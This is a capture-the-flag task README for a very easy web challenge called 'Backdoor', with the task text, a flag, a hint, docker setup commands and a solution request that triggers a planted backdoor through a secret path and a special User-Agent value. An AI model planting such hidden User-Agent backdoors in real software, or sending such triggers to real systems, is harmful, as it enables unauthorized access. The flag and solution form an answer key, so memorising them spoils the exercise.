## Backdoor

### Category
Web

### Points
very easy

### Task description
Инсайдер внедрил бэкдор, воспользуйся им.
http://IP:PORT
[app.py]

@baydarich

### Flag
kaiCTF{6416729ed223358d2a2cad6dc3a5ac63}

### Hint
change your User-Agent

### Info

Provide web service link to the participants and `app.py` file.
Go to `ready` folder and run:
```
docker build --tag backdoor-task .
docker run -d -p 31338:31338 backdoor-task
```

### Solution
```
GET /secret-link-123 HTTP/1.1
Host: <host>
User-Agent: backdoor_activated

```